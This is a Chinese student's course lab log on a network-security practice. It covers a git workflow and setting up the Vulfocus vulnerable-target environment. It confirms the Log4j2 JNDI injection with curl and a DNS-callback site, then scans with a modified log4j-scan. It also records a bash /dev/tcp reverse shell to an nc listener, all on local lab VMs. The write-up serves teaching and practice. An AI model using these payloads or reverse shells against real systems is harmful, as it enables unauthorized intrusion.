# 个人开发日志 -- Dalechu

实验环境 :
- 主机 : Windows11 23H2
- 虚拟机平台 : VMware Workstation Pro 16.2.4 
- kali@attacker :  2023.4
- kali@victim : 2024.1

---

## 2024-07-08 : 确定 git 作业流程, 开始搭建环境

### 内容

#### Git 作业流程

上午听了老师的作业要求, 我和 lihan3238 讨论了一下交作业的流程, 规范如下 :
- 小组成员基于 main 分支建立自己的工作分支
- 修改内容后, 组员先提交到自己的分支中, 再 pull request, 审核后合并到 main 分支中 ( 并处理可能存在的冲突 )
- 组员使用 git rebase 命令同步自己的分支, 维持 commit 记录的简洁和连贯性

具体流程如下 :

```
git checkout your_workspace   # 切换到你的工作分支 your_workspace

# 干完活了, 准备提交到远程仓库

git add.  # 所有修改放到暂存区

git commit -m "描述你的更改"   # 提交

git push   # 推送到远程仓库的 your_workspace 分支

#去 GitHub 上 pull request, 等组长审核, 通过之后, 你的工作就推送到 main 分支中了 : 

git checkout main   # 切换到 main 分支

git pull   # 拉取 main 最新内容到本地

git checkout your_workspace   # 切换到 your_workspace 分支

git rebase main   # 相当于将 main 内容与本地 your_workspace 结合, 并将 your_workspace 的 commit 记录跳跃到当前 main 中来, 更加简洁

git push    # 将本地的 rebase 操作同步到远程仓库
```

#### 搭建基本环境

我习惯使用 VMware 平台, kali 版本为 2024.1, 参考老师 [视频](https://www.bilibili.com/video/BV1p3411x7da?p=7&vd_source=5805c1231cd951b8c81ad0a508b22601) 中的演示.

使用命令 `apt install -y docker.io docker-compose jq` 安装 docker : 

![](../img/DaleChu/install_docker.png)

查看 git 和 docker 版本 :

![](../img/DaleChu/git_docker_v.png)

使用命令 `git clone https://github.com/c4pr1c3/ctf-games.git` 克隆 ctf-games 仓库 :

![](../img/DaleChu/git_clone_ctf-games.png)


参考 [小陈的容器镜像站](https://mp.weixin.qq.com/s/jaUb7sSLDBXrU3F7crtWPA)  配置 docker 镜像源 :

![](../img/DaleChu/docker_config.png)

拉取 docker 镜像 vulfocus :

![](../img/DaleChu/docker_pull_vulfocus.png)

切换到 ctf-games/fofapro/vulfocus 目录下, 执行 `bash start.sh`, 选择 host-only 网卡对应的 IP 地址 :

![](../img/DaleChu/start_sh.png)

在宿主机浏览器上访问此 IP 地址, 默认用户名和口令均为 admin : 

![](../img/DaleChu/dashboard.png)


### 问题

docker 镜像源, 感谢之前程老师推荐的 [小陈的容器镜像站](https://mp.weixin.qq.com/s/jaUb7sSLDBXrU3F7crtWPA). 目前仍可用.

### 参考

- [Xuyan-cmd 的实验报告 ](https://github.com/Xuyan-cmd/Network-security-attack-and-defense-practice)
- [详述 Git 的 rebase 命令使用方法](https://blog.csdn.net/qq_35246620/article/details/124718643)
- [git rebase 用法详解与工作原理](https://waynerv.com/posts/git-rebase-intro/)



---


## 2024-07-09 : Log4j2 漏洞的存在性检测和

### 内容

#### Log4j2 漏洞检测

下载 Log4j2 镜像并启动漏洞靶标 :

![](../img/DaleChu/log4j2.png)

尝试在 URL 后补充 '/hell' 和 '/hello' :

![](../img/DaleChu/hell.png)

![](../img/DaleChu/hello.png)

在 kali 中执行 `docker ps` 查看正在运行的容器 :

![](../img/DaleChu/eloquent_boyd.png)

Log4j2 对应的容器名称为 eloquent_boyd

进入容器 :

```shell
docker exec -it eloquent_boyd bash
```

![](../img/DaleChu/enter_ctn.png)

发现 demo.jar 文件, 将其拷贝出来 :

```shell
docker cp eloquent_boyd:/demo/demo.jar ./
```

![](../img/DaleChu/demojar.png)

使用 `jd-gui` 工具反编译, 查看代码 :

![](../img/DaleChu/javade.png)

确实发现漏洞


#### 漏洞可利用性检测

打开网站 http://www.dnslog.cn/ , 获取随机子域名 `95p55c.dnslog.cn` :

![](../img/DaleChu/95p55c.png)

根据靶场容器 URL 和获取的子域名，对 payload 字段进行编码, 编码平台可使用 https://www.urlencoder.org/ .

```shell
# 编码内容 : ${jndi:ldap://ottlt5.dnslog.cn/dalechu}

# 编码结果 : %24%7Bjndi%3Aldap%3A%2F%2F95p55c.dnslog.cn%2Fdalechu%7D

# curl 命令 :
curl "http://192.168.5.132:50721/hello?payload=%24%7Bjndi%3Aldap%3A%2F%2F95p55c.dnslog.cn%2Fdalechu%7D"

```

发现四条解析记录，说明漏洞可利用 : 

![](../img/DaleChu/curl.png)



### 参考

- [Kali 关闭自动锁屏功能](https://www.cnblogs.com/test-gang/p/18275596)

- [Xuyan-cmd 的实验报告 ](https://github.com/Xuyan-cmd/Network-security-attack-and-defense-practice)

- [lihan3238 的实验日志](https://github.com/lihan3238/Network-Security-Comprehensive-Practice/blob/main/0_lihan3238/%E4%B8%AA%E4%BA%BA%E5%BC%80%E5%8F%91%E6%97%A5%E5%BF%97.md)


### 备注
提交到远程仓库时不小心将 `dalechu` 打成了 `Dalechu`, 相当于新建了一个分支, 并且合并到了 `main` 分支上. 现处理如下 : 对 `Dalechu` 分支进行 git rebase, 同步其内容, 删除 `dalechu` 分支. 经过认真检查, 主分支没有被破坏, 特此记录, 下次引以为戒 ! 

---


## 2024-07-10 : Log4j2 漏洞利用

### 内容

#### 下载工具 log4j-scan 并扫描漏洞 :

```shell
git clone https://github.com/fullhunt/log4j-scan.git

cd log4j-scan

# 安装依赖
pip install -r requirements.txt

# 在 log4j-scan.py 的 post_data_parameters 中手动添加 payload 参数或无脑替换 :  
sed -i.bak 's/password"/password", "payload"/' log4j-scan.py

# 将 log4j-scan.py 文件 349 行处的 GET 请求参数中的 `v` 改为 `payload` 

# 扫描靶场容器, 注意这里使用 get 而不是 post !!!
python log4j-scan.py --request-type get -u http://192.168.5.132:49576/hello --dns-callback-provider dnslog.cn
```

![](../img/DaleChu/pipreq.png)

![](../img/DaleChu/add_payload.png)

![](../img/DaleChu/v_to_payload.png)

![](../img/DaleChu/get_it.png)

成功扫描到漏洞


### 问题

这里我参考了组员 lihan3238 的探索过程和痛苦经历, 我就没有遇到什么坑了 >_< . 另外, 我是在 Windows 主机中克隆 log4j2-scan 并执行 python 程序的, 并没有什么大问题, 只是如果用 `python3` 来执行 log4j-scan.py , 终端不会有任何响应信息, 发现改为 `python` 即可正确执行.  

### 参考

- [lihan3238 的实验记录](https://github.com/lihan3238/Network-Security-Comprehensive-Practice/blob/lihan3238/0_lihan3238/%E4%B8%AA%E4%BA%BA%E5%BC%80%E5%8F%91%E6%97%A5%E5%BF%97.md#%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%88%A9%E7%94%A8%E6%80%A7%E6%A3%80%E6%B5%8B)


---


## 2024-07-11 : 漏洞靶标攻防

### 内容

新建一台 kali 虚拟机, 为其配置一块 host-only 网卡, 主机名改为 `attacker` :

```shell
hostnamectl set-hostname attacker

# 在 /etc/hosts 文件中添加 127.0.0.1 和 attacker 的记录

# 重启系统

# 同样, 另一台虚拟机的主机名改为 victim
```

![](../img/DaleChu/rename_attacker.png)

在虚拟机 attacker 上安装 tmux 和 asciinema :

```shell
sudo apt install tmux asciinema
```

tmux 的简单使用 :

```shell
# 建立名为 session_name 的会话
tmux new -s session_name 

# 先 Ctrl + B, 再 % : 左右分屏
# 先 Ctrl + B, 再 " : 上下分屏

# 先 Ctrl + B, 再 D : 切换回原先终端环境

# 切换回 session_name 会话中
tmux a -t session_name 

```

在 attacker 虚拟机中先简单布置两个终端窗口, 一个为 attacker 本身, 另一个通过 ssh 连接到 victim 虚拟机.

在 attacker 终端窗口上 :

```shell
ip a 
# 查看 host-only 网卡 IP 地址

nc -l -p 7777

# 当可以进入 victim 虚拟机的容器后 :

ls
ls /tmp
ps aux

```

在 victim 终端窗口上 :

```shell
# 查看当前运行中的容器
sudo docker ps

# 复制目标容器名

# 进入容器 agitated_curie 内
sudo docker exec -it agitated_curie /bin/bash     

# 进入容器后, 执行 :
bash -i >& /dev/tcp/192.168.5.134/7777 0>&1 
# 这里的 192.168.5.134 为 attacker 虚拟机 host-only 网卡对应 IP 地址
```

录制的 asciinema 视频 :

[![asciinema_0](https://asciinema.org/a/yruCeOBQtHKoa4kS0LB2r3Bsj.svg)](https://asciinema.org/a/yruCeOBQtHKoa4kS0LB2r3Bsj)



### 问题

我本来配置了 host-only 网卡 eth0 和 NAT 模式网卡 eth1, 但 kali 开机后, 使用 `ip a` 命令查看 IP 地址, 发现这两块网卡的 state 都是 DOWN, 正常网卡应该是 UP 的. 尝试解决这个问题 :

以 eth0 为例, 临时方案 : 

```shell
sudo ip link set eth0 up  # 将网卡 eth0 设置为 UP
sudo dhclient eth0 # 获取 IP 地址
```

完全解决方案 ( Kali Linux 2023.4 版本可行 ) :
```shell
# 编辑 /etc/network/interfaces 文件, 添加 :
auto eth0
iface eth0 inet dhcp

# 如此, 系统启动时会自动启用网络接口 eth0, 并使用 DHCP 分配 IP 地址
```

### 参考

- [网络安全综合实验视频教程](https://www.bilibili.com/video/BV1p3411x7da?p=19&vd_source=5805c1231cd951b8c81ad0a508b22601)

- [lihan3238 的实验记录](https://github.com/lihan3238/Network-Security-Comprehensive-Practice/blob/main/0_lihan3238/%E4%B8%AA%E4%BA%BA%E5%BC%80%E5%8F%91%E6%97%A5%E5%BF%97.md#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%95%88%E6%9E%9C%E8%AF%84%E4%BC%B0-%E5%8F%8D%E5%BC%B9-shelllog4j2-cve-2021-44228)

---





## 2024-07-12 : 

### 内容


### 问题


### 参考

- []()

---




## 2024-07-13 : 

### 内容


### 问题


### 参考

- []()

---